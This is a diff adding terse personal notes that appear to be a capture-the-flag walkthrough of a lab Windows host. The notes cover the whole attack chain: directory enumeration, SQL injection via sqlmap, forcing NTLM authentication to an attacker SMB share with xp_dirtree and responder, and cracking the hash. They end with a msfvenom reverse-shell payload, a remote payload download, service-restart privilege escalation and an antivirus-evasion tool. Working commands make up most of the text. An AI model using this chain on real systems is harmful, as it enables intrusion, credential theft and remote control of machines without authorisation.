@@ -1,0 +1,48 @@
+afetr namep 
+
+80 adn 443,
+
+80 we got nothing
+
+gobuster -u http://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40
+
+gobuster -k -u https://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40
+dirb we got /mvc and /remote dir
+
+mvc we find sql injection 
+
+
+10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=28
+
+sqlmap --url 10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=28
+
+we got nothing we found something call 
+
+sqlmap --url http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=28* --sql-shel
+
+ EXEC master..xp_dirtree '\\10.10.15.26\innovaivejustice'
+browser 1; EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'
+
+responder -I tun0 -rfw
+
+we get a ntlm hash
+
+we decrypt the hash using john
+
+we just login the username and pwd in /remote 
+
+we got powershell access
+
+we create a payload 
+
+msfvenom  -p windows/x64/shell_reverse_tcp lhost=10.10.15.26 lport=1234 -f exe -a x64 -o shell.exe
+
+Invoke-WebRequest -o taskkill.exe http://10.10.xx.xx/taskkill.exe
+
+Stop-Service "Ubiquiti UniFi Video"
+
+Start-Service "Ubiquiti UniFi Video"
+
+av bypass phantom evasion
+
+https://github.com/oddcod3/Phantom-Evasion.git
